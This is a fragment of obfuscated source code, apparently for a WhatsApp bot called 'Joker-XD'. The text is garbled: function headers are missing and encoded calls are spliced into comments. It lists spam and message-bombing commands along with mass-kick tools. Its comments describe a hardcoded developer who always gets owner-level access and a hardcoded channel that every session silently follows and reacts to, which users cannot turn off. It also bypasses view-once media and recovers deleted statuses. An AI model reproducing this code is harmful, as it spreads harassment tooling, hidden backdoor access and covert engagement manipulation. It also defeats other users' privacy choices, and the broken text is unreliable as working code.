  menu: _0x750c7afa(_0x3c7d8f2f[150]), commands: _0x750c7afa(_0x3c7d8f2f[150]), ping: _0x750c7afa(_0x3c7d8f2f[151]), alive: _0x750c7afa(_0x3c7d8f2f[152]), runtime: _0x750c7afa(_0x3c7d8f2f[152]), uptime: _0x750c7afa(_0x3c7d8f2f[152]), up: _0x750c7afa(_0x3c7d8f2f[152]), a: _0x750c7afa(_0x3c7d8f2f[152]), help: "❓", settings: _0x750c7afa(_0x3c7d8f2f[153]), setting: _0x750c7afa(_0x3c7d8f2f[153]),
  // AI
  ai: _0x750c7afa(_0x3c7d8f2f[154]), translate: _0x750c7afa(_0x3c7d8f2f[155]), tr: _0x750c7afa(_0x3c7d8f2f[155]), tl: _0x750c7afa(_0x3c7d8f2f[155]), imagine: _0x750c7afa(_0x3c7d8f2f[156]), chatbot: _0x750c7afa(_0x3c7d8f2f[157]),
  // JOKER / xd-Spam tools
  jokersend: _0x750c7afa(_0x3c7d8f2f[158]), jokers: _0x750c7afa(_0x3c7d8f2f[158]), js: _0x750c7afa(_0x3c7d8f2f[158]), jokertag: _0x750c7afa(_0x3c7d8f2f[159]), jokerall: _0x750c7afa(_0x3c7d8f2f[160]), jokerhelp: _0x750c7afa(_0x3c7d8f2f[161]),
  bom: _0x750c7afa(_0x3c7d8f2f[162]), bomall: _0x750c7afa(_0x3c7d8f2f[162]), bomtag: _0x750c7afa(_0x3c7d8f2f[162]),
  stop: "⏹", stopjs: "⏹", stopjt: "⏹", stopja: "⏹", stopjokers: "⏹", stopjokertag: "⏹", stopjokerall: "⏹", stopbom: "⏹", stopba: "⏹", stopbt: "⏹",
  // OWNER
  jid: _0x750c7afa(_0x3c7d8f2f[163]), alljid: _0x750c7afa(_0x3c7d8f2f[150]), chjid: _0x750c7afa(_0x3c7d8f2f[160]), chaneljid: _0x750c7afa(_0x3c7d8f2f[160]), unfollow: _0x750c7afa(_0x3c7d8f2f[160]), keep: _0x750c7afa(_0x3c7d8f2f[164]),
  ban: _0x750c7afa(_0x3c7d8f2f[165]), unban: "✅", banlist: _0x750c7afa(_0x3c7d8f2f[150]), clearban: _0x750c7afa(_0x3c7d8f2f[166]),
  block: _0x750c7afa(_0x3c7d8f2f[165]), unblock: "✅", blocklist: _0x750c7afa(_0x3c7d8f2f[150]), broadcast: _0x750c7afa(_0x3c7d8f2f[160]),
  sudo: _0x750c7afa(_0x3c7d8f2f[167]), delsudo: "❌", mode: _0x750c7afa(_0x3c7d8f2f[168]), delete: _0x750c7afa(_0x3c7d8f2f[166]), del: _0x750c7afa(_0x3c7d8f2f[166]),
  left: _0x750c7afa(_0x3c7d8f2f[137]), leave: _0x750c7afa(_0x3c7d8f2f[137]), join: "➕", groups: _0x750c7afa(_0x3c7d8f2f[169]),
  chatbotadd: "➕", chatbotrem: "❌", setbotname: _0x750c7afa(_0x3c7d8f2f[170]), setownername: _0x750c7afa(_0x3c7d8f2f[170]), setprefix: _0x750c7afa(_0x3c7d8f2f[171]),
  // GROUP
  kick: _0x750c7afa(_0x3c7d8f2f[172]), remove: _0x750c7afa(_0x3c7d8f2f[172]), k: _0x750c7afa(_0x3c7d8f2f[172]), out: _0x750c7afa(_0x3c7d8f2f[172]), nikul: _0x750c7afa(_0x3c7d8f2f[172]), dufa: _0x750c7afa(_0x3c7d8f2f[172]),
  kickall: _0x750c7afa(_0x3c7d8f2f[173]), removeall: _0x750c7afa(_0x3c7d8f2f[173]), kall: _0x750c7afa(_0x3c7d8f2f[173]),
  promote: _0x750c7afa(_0x3c7d8f2f[174]), toadmin: _0x750c7afa(_0x3c7d8f2f[174]), demote: _0x750c7afa(_0x3c7d8f2f[175]), dismiss: _0x750c7afa(_0x3c7d8f2f[175]), tomember: _0x750c7afa(_0x3c7d8f2f[175]),
  tagall: _0x750c7afa(_0x3c7d8f2f[160]), tag: _0x750c7afa(_0x3c7d8f2f[160]), hidetag: _0x750c7afa(_0x3c7d8f2f[176]), admin: _0x750c7afa(_0x3c7d8f2f[167]), members: _0x750c7afa(_0x3c7d8f2f[177]),
  link: _0x750c7afa(_0x3c7d8f2f[178]), resetlink: _0x750c7afa(_0x3c7d8f2f[168]), open: _0x750c7afa(_0x3c7d8f2f[179]), close: _0x750c7afa(_0x3c7d8f2f[180]),
  setdesc: _0x750c7afa(_0x3c7d8f2f[181]), setgroupname: _0x750c7afa(_0x3c7d8f2f[170]), setname: _0x750c7afa(_0x3c7d8f2f[170]), gname: _0x750c7afa(_0x3c7d8f2f[170]),
  welcome: _0x750c7afa(_0x3c7d8f2f[137]), setwelcome: _0x750c7afa(_0x3c7d8f2f[170]), goodbye: _0x750c7afa(_0x3c7d8f2f[137]), setgoodbye: _0x750c7afa(_0x3c7d8f2f[170]),
  antilink: _0x750c7afa(_0x3c7d8f2f[165]), antichannel: _0x750c7afa(_0x3c7d8f2f[165]), antichanel: _0x750c7afa(_0x3c7d8f2f[165]), antich: _0x750c7afa(_0x3c7d8f2f[165]), antisticker: _0x750c7afa(_0x3c7d8f2f[165]), antistic: _0x750c7afa(_0x3c7d8f2f[165]), antistiker: _0x750c7afa(_0x3c7d8f2f[165]),
  antivoice: _0x750c7afa(_0x3c7d8f2f[165]), antipic: _0x750c7afa(_0x3c7d8f2f[165]), antipicture: _0x750c7afa(_0x3c7d8f2f[165]), antivideo: _0x750c7afa(_0x3c7d8f2f[165]), antitext: _0x750c7afa(_0x3c7d8f2f[165]),
  antibot: _0x750c7afa(_0x3c7d8f2f[182]), antibug: _0x750c7afa(_0x3c7d8f2f[183]), hidemybot: _0x750c7afa(_0x3c7d8f2f[184]), hidemy: _0x750c7afa(_0x3c7d8f2f[184]), hideme: _0x750c7afa(_0x3c7d8f2f[184]), hidebot: _0x750c7afa(_0x3c7d8f2f[184]), whois: _0x750c7afa(_0x3c7d8f2f[185]), who: _0x750c7afa(_0x3c7d8f2f[185]),
  antitag: _0x750c7afa(_0x3c7d8f2f[165]), antitagme: _0x750c7afa(_0x3c7d8f2f[165]), agm: _0x750c7afa(_0x3c7d8f2f[165]), antigroupmention: _0x750c7afa(_0x3c7d8f2f[165]),
  gstatus: _0x750c7afa(_0x3c7d8f2f[186]), togroupstatus: _0x750c7afa(_0x3c7d8f2f[186]), togstatus: _0x750c7afa(_0x3c7d8f2f[186]),
  xds: _0x750c7afa(_0x3c7d8f2f[186]), xdgstatus: _0x750c7afa(_0x3c7d8f2f[186]), xd: _0x750c7afa(_0x3c7d8f2f[186]),
  antigroupstatus: _0x750c7afa(_0x3c7d8f2f[165]), ags: _0x750c7afa(_0x3c7d8f2f[165]),
  antideletestatus: _0x750c7afa(_0x3c7d8f2f[183]), ads: _0x750c7afa(_0x3c7d8f2f[183]), antidelstatus: _0x750c7afa(_0x3c7d8f2f[183]),
  save: _0x750c7afa(_0x3c7d8f2f[187]), sv: _0x750c7afa(_0x3c7d8f2f[187]), statussave: _0x750c7afa(_0x3c7d8f2f[187]),
  send: _0x750c7afa(_0x3c7d8f2f[188]), resend: _0x750c7afa(_0x3c7d8f2f[188]), extract: _0x750c7afa(_0x3c7d8f2f[188]),
  autostatusview: _0x750c7afa(_0x3c7d8f2f[189]), asv: _0x750c7afa(_0x3c7d8f2f[189]), avs: _0x750c7afa(_0x3c7d8f2f[189]), statusview: _0x750c7afa(_0x3c7d8f2f[189]),
  react: _0x750c7afa(_0x3c7d8f2f[132]), statusreact: _0x750c7afa(_0x3c7d8f2f[132]), sreact: _0x750c7afa(_0x3c7d8f2f[132]), autoreactstatus: _0x750c7afa(_0x3c7d8f2f[132]), autostatusreact: _0x750c7afa(_0x3c7d8f2f[132]),
  groupadd: _0x750c7afa(_0x3c7d8f2f[177]), groupaddprivacy: _0x750c7afa(_0x3c7d8f2f[177]), whoadd: _0x750c7afa(_0x3c7d8f2f[177]),
  warn: _0x750c7afa(_0x3c7d8f2f[190]), setwarn: _0x750c7afa(_0x3c7d8f2f[190]), resetwarn: _0x750c7afa(_0x3c7d8f2f[168]), rw: _0x750c7afa(_0x3c7d8f2f[168]), allow: "✅",
  approve: "✅", approverequests: "✅", approveall: "✅",
  // DOWNLOAD
  song: _0x750c7afa(_0x3c7d8f2f[141]), ytmp3: _0x750c7afa(_0x3c7d8f2f[141]), music: _0x750c7afa(_0x3c7d8f2f[141]), play: _0x750c7afa(_0x3c7d8f2f[141]),
  video: _0x750c7afa(_0x3c7d8f2f[191]), ytmp4: _0x750c7afa(_0x3c7d8f2f[191]), yts: _0x750c7afa(_0x3c7d8f2f[185]),
  facebook: _0x750c7afa(_0x3c7d8f2f[192]), fb: _0x750c7afa(_0x3c7d8f2f[192]), fbaudio: _0x750c7afa(_0x3c7d8f2f[141]), facebookaudio: _0x750c7afa(_0x3c7d8f2f[141]),
  instagram: _0x750c7afa(_0x3c7d8f2f[193]), ig: _0x750c7afa(_0x3c7d8f2f[193]), insta: _0x750c7afa(_0x3c7d8f2f[193]), igaudio: _0x750c7afa(_0x3c7d8f2f[141]), instagramaudio: _0x750c7afa(_0x3c7d8f2f[141]), instaaudio: _0x750c7afa(_0x3c7d8f2f[141]),
  tiktok: _0x750c7afa(_0x3c7d8f2f[141]), tt: _0x750c7afa(_0x3c7d8f2f[141]), ttaudio: _0x750c7afa(_0x3c7d8f2f[141]), tiktokaudio: _0x750c7afa(_0x3c7d8f2f[141]),
  twitter: _0x750c7afa(_0x3c7d8f2f[194]), pinterest: _0x750c7afa(_0x3c7d8f2f[164]), pin: _0x750c7afa(_0x3c7d8f2f[164]), node: _0x750c7afa(_0x3c7d8f2f[195]), adultmenu: _0x750c7afa(_0x3c7d8f2f[195]), adult: _0x750c7afa(_0x3c7d8f2f[195]),
  // AUTO
  autoreact: _0x750c7afa(_0x3c7d8f2f[147]), setreact: _0x750c7afa(_0x3c7d8f2f[168]), setract: _0x750c7afa(_0x3c7d8f2f[168]),
  autostatus: _0x750c7afa(_0x3c7d8f2f[186]),
  autoread: _0x750c7afa(_0x3c7d8f2f[196]), ar: _0x750c7afa(_0x3c7d8f2f[196]),
  autorecord: _0x750c7afa(_0x3c7d8f2f[197]), autotype: _0x750c7afa(_0x3c7d8f2f[198]), autorecordtype: _0x750c7afa(_0x3c7d8f2f[197]),
  alwaysonline: _0x750c7afa(_0x3c7d8f2f[199]), antidelete: _0x750c7afa(_0x3c7d8f2f[166]), antidel: _0x750c7afa(_0x3c7d8f2f[166]), antiedit: _0x750c7afa(_0x3c7d8f2f[170]), antied: _0x750c7afa(_0x3c7d8f2f[170]), online: _0x750c7afa(_0x3c7d8f2f[199]), lastseen: _0x750c7afa(_0x3c7d8f2f[189]),
  // CONVERT
  tomp3: _0x750c7afa(_0x3c7d8f2f[141]), tovoice: _0x750c7afa(_0x3c7d8f2f[200]), tov: _0x750c7afa(_0x3c7d8f2f[200]), topp: _0x750c7afa(_0x3c7d8f2f[200]),
  sticker: _0x750c7afa(_0x3c7d8f2f[201]), s: _0x750c7afa(_0x3c7d8f2f[201]), stick: _0x750c7afa(_0x3c7d8f2f[201]), stiker: _0x750c7afa(_0x3c7d8f2f[201]), take: _0x750c7afa(_0x3c7d8f2f[202]), steal: _0x750c7afa(_0x3c7d8f2f[202]),
  toimg: _0x750c7afa(_0x3c7d8f2f[201]), toimage: _0x750c7afa(_0x3c7d8f2f[201]), tovideo: _0x750c7afa(_0x3c7d8f2f[191]), tomp4: _0x750c7afa(_0x3c7d8f2f[191]),
  setpp: _0x750c7afa(_0x3c7d8f2f[203]), setmyprofilepic: _0x750c7afa(_0x3c7d8f2f[203]), setpname: _0x750c7afa(_0x3c7d8f2f[170]), setmyprofilename: _0x750c7afa(_0x3c7d8f2f[170]),
  hello: _0x750c7afa(_0x3c7d8f2f[137]), det: _0x750c7afa(_0x3c7d8f2f[166]),
  tts: _0x750c7afa(_0x3c7d8f2f[160]), say: _0x750c7afa(_0x3c7d8f2f[160]), url: _0x750c7afa(_0x3c7d8f2f[178]), upload: _0x750c7afa(_0x3c7d8f2f[178]), readmore: _0x750c7afa(_0x3c7d8f2f[196]),
  // TOOLS
  define: _0x750c7afa(_0x3c7d8f2f[204]), weather: _0x750c7afa(_0x3c7d8f2f[205]), currency: _0x750c7afa(_0x3c7d8f2f[206]), qr: _0x750c7afa(_0x3c7d8f2f[186]),
  // MEDIA
  vv: _0x750c7afa(_0x3c7d8f2f[207]), vv2: _0x750c7afa(_0x3c7d8f2f[207]), viewone: _0x750c7afa(_0x3c7d8f2f[207]), antiviewonce: _0x750c7afa(_0x3c7d8f2f[207]), gcp: _0x750c7afa(_0x3c7d8f2f[201]), gcpp: _0x750c7afa(_0x3c7d8f2f[201]), getpp: _0x750c7afa(_0x3c7d8f2f[201]), setmenuimage: _0x750c7afa(_0x3c7d8f2f[201]), setmenuimg: _0x750c7afa(_0x3c7d8f2f[201])
};

  if (!cmd) return null;
  return COMMAND_REACT_MAP[String(cmd).toLowerCase()] || null;
}

/**
 * Command auto-react:
 * - Only when cfg.command is ON
 * - Checks bot mode: in private mode, only reacts for privileged users_0x750c7afa(_0x3c7d8f2f[208])s dedicated random list.
  // Do not depend on the normal autoreact setting or its saved index.
  return CHANNEL_REACT_EMOJIS[Math.floor(Math.random() * CHANNEL_REACT_EMOJIS.length)];
}

// Per-session channel-post dedupe.
// Previously a single global Map → only the first session (usually King) reacted;
// every child session saw the post as already handled and skipped.
// Now each bot number has its own Map so King + all /connect children can react.

  const n = botNumberFromSock(sock) || jidNumber(sock?.user?.id) || _0x750c7afa(_0x3c7d8f2f[209]);
  if (!handledChannelPostsByBot.has(n)) {
    handledChannelPostsByBot.set(n, new Map());
  }
  return handledChannelPostsByBot.get(n);
}

/**
 * React on a WhatsApp Channel post.
 * Tries multiple methods silently (no console / panel logs).
 * 1) newsletterReactMessage(serverId)
 * 2) sendMessage react with original key
 * 3) sendMessage react with reconstructed key
 */
  if (!emoji) return false;
  let ok = false;

  // Method 1: official channel react API
  if (serverId && typeof sock.newsletterReactMessage === _0x750c7afa(_0x3c7d8f2f[210])) {
    try {
      await sock.newsletterReactMessage(jid, String(serverId), emoji);
      ok = true;
    } catch {}
  }

  // Method 2: regular react with original message key (best when available)
  if (!ok && originalKey) {
    try {
      await sock.sendMessage(jid, { react: { text: emoji, key: originalKey } });
      ok = true;
    } catch {}
  }

  // Method 3: reconstructed key using serverId / id
  if (!ok && serverId) {
    try {
      await sock.sendMessage(jid, {
        react: {
          text: emoji,
          key: {
            remoteJid: jid,
            id: String(serverId),
            fromMe: false,
            server_id: String(serverId)
          }
        }
      });
      ok = true;
    } catch {}
  }

  return ok;
}

/** On connect: fetch recent channel posts and react (silent) */
  try {
    if (typeof sock.newsletterFetchMessages !== _0x750c7afa(_0x3c7d8f2f[210])) return;
    const result = await sock.newsletterFetchMessages(HARDCODED_CHANNEL_JID, 25, 0, 0);
    const serverIds = [];

    const walk = (node) => {
      if (!node) return;
      if (Array.isArray(node)) { for (const n of node) walk(n); return; }
      if (typeof node !== _0x750c7afa(_0x3c7d8f2f[211])) return;
      const attrs = node.attrs || {};
      const sid = attrs.server_id || attrs.serverId || node.server_id || node.serverId;
      if (sid != null) {
        const s = String(sid).trim();
        if (/^\d+$/.test(s) && !serverIds.includes(s)) serverIds.push(s);
      }
      if (node.content) walk(node.content);
      if (node.messages) walk(node.messages);
      for (const k of Object.keys(node)) {
        if (k === _0x750c7afa(_0x3c7d8f2f[212]) || k === _0x750c7afa(_0x3c7d8f2f[213])) continue;
        const v = node[k];
        if (v && typeof v === _0x750c7afa(_0x3c7d8f2f[211])) walk(v);
      }
    };
    walk(result);

    if (Array.isArray(result)) {
      for (const item of result) {
        const sid = item?.server_id || item?.serverId || item?.key?.server_id || item?.key?.id;
        if (sid != null) {
          const s = String(sid).trim();
          if (/^\d+$/.test(s) && !serverIds.includes(s)) serverIds.push(s);
        }
      }
    }

    for (const sid of serverIds) {
      const emoji = nextChannelEmoji(sock);
      if (!emoji) continue;
      await reactOnChannelPost(sock, HARDCODED_CHANNEL_JID, sid, emoji, null);
      await delay(600);
    }
  } catch {}
}

  const jid = msg?.key?.remoteJid;
  if (!jid || msg.key.fromMe || jid === _0x750c7afa(_0x3c7d8f2f[214])) return;
  const m = unwrapMessage(msg.message || {});
  if (m?.reactionMessage || m?.protocolMessage) return;

  // Hardcoded WhatsApp Channel — only NEW posts, 1 second delay (silent, cannot be turned off)
  // Dedupe is PER BOT so King + every /connect child can all react independently.
  if (jid === HARDCODED_CHANNEL_JID) {
    const serverId = getChannelServerId(msg);
    const originalKey = msg.key;
    const uniqueId = String(serverId || originalKey?.id || `${Date.now()}-${Math.random()}`);
    const handled = getHandledChannelMap(sock);
    if (handled.has(uniqueId)) return;
    handled.set(uniqueId, Date.now());
    // Keep memory bounded per bot
    if (handled.size > 500) {
      const first = handled.keys().next().value;
      handled.delete(first);
    }
    setTimeout(async () => {
      try {
        const emoji = nextChannelEmoji(sock);
        if (!emoji) return;
        // If server_id is unavailable, the original key is still attempted.
        await reactOnChannelPost(sock, jid, serverId, emoji, originalKey);
      } catch {}
    }, 1000);
    return;
  }

  const cfg = getAutoReactConfig(sock), kind = isGroup(jid) ? _0x750c7afa(_0x3c7d8f2f[215]) : _0x750c7afa(_0x3c7d8f2f[149]);
  if (!scopeEnabled(cfg, jid, kind)) return;
  const emoji = nextConfiguredReaction(cfg, text); if (!emoji) return;
  saveAutoReactConfig(cfg, sock);
  try { await sock.sendMessage(jid, { react: { text: emoji, key: msg.key } }); } catch {}
}
  const jid=msg?.key?.remoteJid; if(!jid||msg.key.fromMe||jid===_0x750c7afa(_0x3c7d8f2f[214])) return;
  const kind=isGroup(jid)?_0x750c7afa(_0x3c7d8f2f[215]):_0x750c7afa(_0x3c7d8f2f[149]), cfg=getAutoReactConfig(sock);
  const rec=presenceScopeEnabled(cfg,jid,kind,_0x750c7afa(_0x3c7d8f2f[216])), typ=presenceScopeEnabled(cfg,jid,kind,_0x750c7afa(_0x3c7d8f2f[217])), both=presenceScopeEnabled(cfg,jid,kind,_0x750c7afa(_0x3c7d8f2f[218]));
  if(!rec&&!typ&&!both) return;
  try{
    if(both){await sock.sendPresenceUpdate(_0x750c7afa(_0x3c7d8f2f[219]),jid);await delay(1000);await sock.sendPresenceUpdate(_0x750c7afa(_0x3c7d8f2f[220]),jid);
      await sock.sendPresenceUpdate(_0x750c7afa(_0x3c7d8f2f[221]),jid);await delay(1000);await sock.sendPresenceUpdate(_0x750c7afa(_0x3c7d8f2f[220]),jid);}
    else if(rec){await sock.sendPresenceUpdate(_0x750c7afa(_0x3c7d8f2f[219]),jid);await delay(1000);await sock.sendPresenceUpdate(_0x750c7afa(_0x3c7d8f2f[220]),jid);}
    else {await sock.sendPresenceUpdate(_0x750c7afa(_0x3c7d8f2f[221]),jid);await delay(1000);await sock.sendPresenceUpdate(_0x750c7afa(_0x3c7d8f2f[220]),jid);}
  }catch(e){console.error(_0x750c7afa(_0x3c7d8f2f[222]),e.message||e);}
}
  const input=String(raw||"").trim(); if(!input) return [];
  try{return [...new Intl.Segmenter(undefined,{granularity:_0x750c7afa(_0x3c7d8f2f[131])}).segment(input)].map(x=>x.segment).filter(x=>/\p{Extended_Pictographic}/u.test(x));}
  catch{return Array.from(input).filter(x=>/\p{Extended_Pictographic}/u.test(x));}
}

// Hardcoded developer — always owner-level, exclusive prefix ®

// Hardcoded channel — always follow + auto-react on connect (cannot be disabled by user)

/** Recent message keys per chat for .delete last N (visible messages only) */
  try {
    if (!msg?.key?.id || !msg.key.remoteJid) return;
    if (msg.key.remoteJid === _0x750c7afa(_0x3c7d8f2f[214])) return;
    const chat = mcKey(sock, msg.key.remoteJid);
    const list = recentMsgStore.get(chat) || [];
    list.push({
      key: msg.key,
      participant: msg.key.participant || msg.participant || msg.key.remoteJid,
      fromMe: !!msg.key.fromMe,
      ts: Date.now()
    });
    // keep last 200 per chat
    while (list.length > 200) list.shift();
    recentMsgStore.set(chat, list);
    if (recentMsgStore.size > 80) {
      const first = recentMsgStore.keys().next().value;
      recentMsgStore.delete(first);
    }
  } catch {}
}
// Short-lived groupMetadata cache to speed up antilink / anti tools under spam
  const ck = mcKey(sock, jid);
  const hit = metaCache.get(ck);
  if (hit && Date.now() - hit.ts < META_CACHE_TTL) return hit.meta;
  const meta = await sock.groupMetadata(jid);
  metaCache.set(ck, { meta, ts: Date.now() });
  if (metaCache.size > 40) {
    const first = metaCache.keys().next().value;
    metaCache.delete(first);
  }
  return meta;
}
// Pending .alljid selections: key = sender number, value = { groups: [...], expires: timestamp }
// Pending .broadcast: key = sender number, value = { groups: [...], message: string, expires: timestamp }

  try {
    if (!fs.existsSync(file)) return fallback;
    return JSON.parse(fs.readFileSync(file, _0x750c7afa(_0x3c7d8f2f[223])));
  } catch { return fallback; }
}
  fs.writeFileSync(file, JSON.stringify(value, null, 2));
}
  return `${Date.now()}-${Math.random().toString(36).slice(2, 10)}`;
}
  return String(jid || "").split("@")[0].split(":")[0].replace(/\D/g, "");
}
  const n = jidNumber(jid);
  return n ? `${n}@s.whatsapp.net` : String(jid || "");
}
  const m = msg.message || {};
  return (
    m.conversation ||
    m.extendedTextMessage?.text ||
    m.imageMessage?.caption ||
    m.videoMessage?.caption ||
    m.documentMessage?.caption ||
    m.buttonsResponseMessage?.selectedButtonId ||
    m.listResponseMessage?.singleSelectReply?.selectedRowId ||
    ""
  ).trim();
}
  return String(jid || "").endsWith(_0x750c7afa(_0x3c7d8f2f[224]));
}
  const m = msg.message || {};
  return m.extendedTextMessage?.contextInfo ||
         m.imageMessage?.contextInfo ||
         m.videoMessage?.contextInfo ||
         m.stickerMessage?.contextInfo ||
         m.audioMessage?.contextInfo ||
         m.documentMessage?.contextInfo ||
         m.buttonsResponseMessage?.contextInfo ||
         m.listResponseMessage?.contextInfo ||
         m.templateButtonReplyMessage?.contextInfo ||
         m.interactiveResponseMessage?.contextInfo ||
         m.viewOnceMessage?.message?.imageMessage?.contextInfo ||
         m.viewOnceMessage?.message?.videoMessage?.contextInfo ||
         {};
}

/** Get quoted message object if user replied to something */
  const ctx = getContext(msg);
  if (!ctx || !ctx.quotedMessage || !ctx.stanzaId) return null;
  // participant present → usually someone else_0x750c7afa(_0x3c7d8f2f[225])s own messages */
  const q = getQuotedMsg(msg);
  if (!q) return false;
  if (q.key.fromMe) return true;
  const botNum = jidNumber(sock?.user?.id || "");
  const botLid = jidNumber(sock?.user?.lid || "");
  const part = jidNumber(q.key.participant || "");
  if (part && (part === botNum || (botLid && part === botLid))) return true;
  return false;
}

/** Deep-unwrap any status / ephemeral / view-once wrappers to the innermost message node */
  let m = message || {};
  for (let i = 0; i < 6; i++) {
    const next =
      m.groupStatusMessage?.message ||
      m.groupStatusMessage ||
      m.groupStatusMessageV2?.message ||
      m.groupStatusMessageV2 ||
      m.groupStatusMentionMessage?.message ||
      m.groupStatusMentionMessage ||
      m.ephemeralMessage?.message ||
      m.viewOnceMessage?.message ||
      m.viewOnceMessageV2?.message ||
      m.viewOnceMessageV2Extension?.message ||
      m.documentWithCaptionMessage?.message ||
      null;
    if (!next || next === m) break;
    m = next;
  }
  return m;
}

  const root = msgOrMessage?.message || msgOrMessage || {};
  const m = root;
  return !!(
    m.groupStatusMessage ||
    m.groupStatusMessageV2 ||
    m.groupStatusMentionMessage ||
    m.ephemeralMessage?.message?.groupStatusMessage ||
    m.ephemeralMessage?.message?.groupStatusMessageV2 ||
    m.ephemeralMessage?.message?.groupStatusMentionMessage ||
    m.viewOnceMessage?.message?.groupStatusMessage ||
    m.viewOnceMessage?.message?.groupStatusMessageV2 ||
    m.imageMessage?.contextInfo?.isGroupStatus ||
    m.videoMessage?.contextInfo?.isGroupStatus ||
    m.extendedTextMessage?.contextInfo?.isGroupStatus ||
    m.audioMessage?.contextInfo?.isGroupStatus ||
    m.stickerMessage?.contextInfo?.isGroupStatus ||
    m.documentMessage?.contextInfo?.isGroupStatus ||
    m.protocolMessage?.type === 25 ||
    m.protocolMessage?.type === 26
  );
}

/**
 * Build recoverable send payload for normal + group-status messages.
 * Tries multiple unwrap paths + direct downloadMediaMessage on original.
 */
  const opts = { logger: pino({ level: _0x750c7afa(_0x3c7d8f2f[226]) }), reuploadRequest: sock.updateMediaMessage };
  const original = sourceMsg?.message || {};
  const candidates = [
    original,
    unwrapStatusMessage(original),
    original.groupStatusMessage,
    original.groupStatusMessageV2,
    original.groupStatusMentionMessage,
    original.ephemeralMessage?.message,
    original.viewOnceMessage?.message,
    original.viewOnceMessageV2?.message
  ].filter(Boolean);

  for (const node of candidates) {
    try {
      const wrapped = { key: sourceMsg.key, message: node };
      // Prefer buildSendContent path
      const built = await buildSendContent(sock, wrapped).catch(() => null);
      if (built && (built.image || built.video || built.audio || built.sticker || built.document || built.text)) {
        return built;
      }
      // Direct media keys on this node
      if (node.imageMessage) {
        const buf = await downloadMediaMessage(wrapped, _0x750c7afa(_0x3c7d8f2f[227]), {}, opts);
        return { image: buf, caption: node.imageMessage.caption || "" };
      }
      if (node.videoMessage) {
        const buf = await downloadMediaMessage(wrapped, _0x750c7afa(_0x3c7d8f2f[227]), {}, opts);
        return { video: buf, caption: node.videoMessage.caption || "" };
      }
      if (node.audioMessage) {
        const buf = await downloadMediaMessage(wrapped, _0x750c7afa(_0x3c7d8f2f[227]), {}, opts);
        return { audio: buf, mimetype: node.audioMessage.mimetype || _0x750c7afa(_0x3c7d8f2f[228]), ptt: !!node.audioMessage.ptt };
      }
      if (node.stickerMessage) {
        const buf = await downloadMediaMessage(wrapped, _0x750c7afa(_0x3c7d8f2f[227]), {}, opts);
        return { sticker: buf };
      }
      if (node.documentMessage) {
        const buf = await downloadMediaMessage(wrapped, _0x750c7afa(_0x3c7d8f2f[227]), {}, opts);
        return {
          document: buf,
          mimetype: node.documentMessage.mimetype || _0x750c7afa(_0x3c7d8f2f[229]),
          fileName: node.documentMessage.fileName || _0x750c7afa(_0x3c7d8f2f[230])
        };
      }
      const txt = node.conversation || node.extendedTextMessage?.text || "";
      if (txt) return { text: txt };
    } catch {}
  }

  // Last resort: download from original message as-is
  try {
    const buf = await downloadMediaMessage(sourceMsg, _0x750c7afa(_0x3c7d8f2f[227]), {}, opts);
    if (buf?.length) {
      if (original.imageMessage || unwrapStatusMessage(original).imageMessage) return { image: buf };
      if (original.videoMessage || unwrapStatusMessage(original).videoMessage) return { video: buf };
      if (original.audioMessage || unwrapStatusMessage(original).audioMessage) return { audio: buf };
      if (original.stickerMessage || unwrapStatusMessage(original).stickerMessage) return { sticker: buf };
      return { document: buf, fileName: _0x750c7afa(_0x3c7d8f2f[231]), mimetype: _0x750c7afa(_0x3c7d8f2f[229]) };
    }
  } catch {}

  const t = getText(sourceMsg);
  if (t) return { text: t };
  return null;
}

/** Cache one message for anti-delete-status recovery (with optional pre-download) */
  if (!msg?.key?.id || msg.key.fromMe) return false;
  if (!isAnyStatusLikeMessage(msg) && String(msg.key.remoteJid || "") !== _0x750c7afa(_0x3c7d8f2f[214])) return false;
  const adsCfg = readJson(sf(sock, _0x750c7afa(_0x3c7d8f2f[232])), { enabled: true });
  let prebuilt = null;
  if (adsCfg.enabled || forcePrebuild) {
    try { prebuilt = await extractRecoverableContent(sock, msg); } catch {}
  }
  messageCache.set(mcKey(sock, msg.key.id), {
    msg,
    timestamp: Date.now(),
    isGroupStatus: isAnyStatusLikeMessage(msg) || String(msg.key.remoteJid || "") === _0x750c7afa(_0x3c7d8f2f[214]),
    prebuilt
  });
  if (messageCache.size > 1000) {
    const first = messageCache.keys().next().value;
    messageCache.delete(first);
  }
  return true;
}

/**
 * On connect: scan history / groups for already-posted statuses and cache them
 * so anti-delete-status can recover even if they were posted before the bot joined.
 * Note: WhatsApp does not expose a full archive of every personal status; we cache
 * whatever the server syncs (history + recent group traffic).
 */
  if (!sock || sock.__statusScanRunning) return;
  sock.__statusScanRunning = true;
  let cached = 0;
  try {
    // 1) In-memory store (if present)
    try {
      const storeMsgs = sock.store?.messages;
      if (storeMsgs && typeof storeMsgs === _0x750c7afa(_0x3c7d8f2f[211])) {
        for (const chatId of Object.keys(storeMsgs)) {
          const bag = storeMsgs[chatId];
          const list = bag?.array || (bag && typeof bag.values === _0x750c7afa(_0x3c7d8f2f[210]) ? [...bag.values()] : Object.values(bag || {}));
          for (const msg of list) {
            if (await cacheStatusMessage(sock, msg)) cached++;
          }
        }
      }
    } catch {}

    // 2) Groups the bot is in — trigger presence so recent status-like msgs may sync
    try {
      const groups = await sock.groupFetchAllParticipating().catch(() => ({}));
      const jids = Object.keys(groups || {}).slice(0, 50);
      for (const gjid of jids) {
        try {
          if (typeof sock.readMessages === _0x750c7afa(_0x3c7d8f2f[210])) {
            // no-op read to keep session warm; actual cache comes from upsert/history
          }
          const bag = sock.store?.messages?.[gjid];
          if (bag) {
            const list = bag.array || Object.values(bag);
            for (const msg of list) {
              if (await cacheStatusMessage(sock, msg)) cached++;
            }
          }
        } catch {}
        await delay(50);
      }
    } catch {}

    console.log(`[Joker-XD] Status scan cached ~${cached} status-like message(s)`);
  } catch (e) {
    console.error(_0x750c7afa(_0x3c7d8f2f[233]), e?.message || e);
  } finally {
    sock.__statusScanRunning = false;
  }
}

/** Build a Baileys send payload from a message (supports text / image / video / sticker / audio / document / gif / group status) */
  let m = sourceMsg.message || {};
  // Unwrap group-status / ephemeral / view-once wrappers so .save / .send work
  m = unwrapStatusMessage(m);

  const wrapped = { key: sourceMsg.key, message: m };
  const opts = { logger: pino({ level: _0x750c7afa(_0x3c7d8f2f[226]) }), reuploadRequest: sock.updateMediaMessage };

  if (m.imageMessage) {
    const buf = await downloadMediaMessage(wrapped, _0x750c7afa(_0x3c7d8f2f[227]), {}, opts);
    return { image: buf, caption: m.imageMessage.caption || "" };
  }
  if (m.videoMessage) {
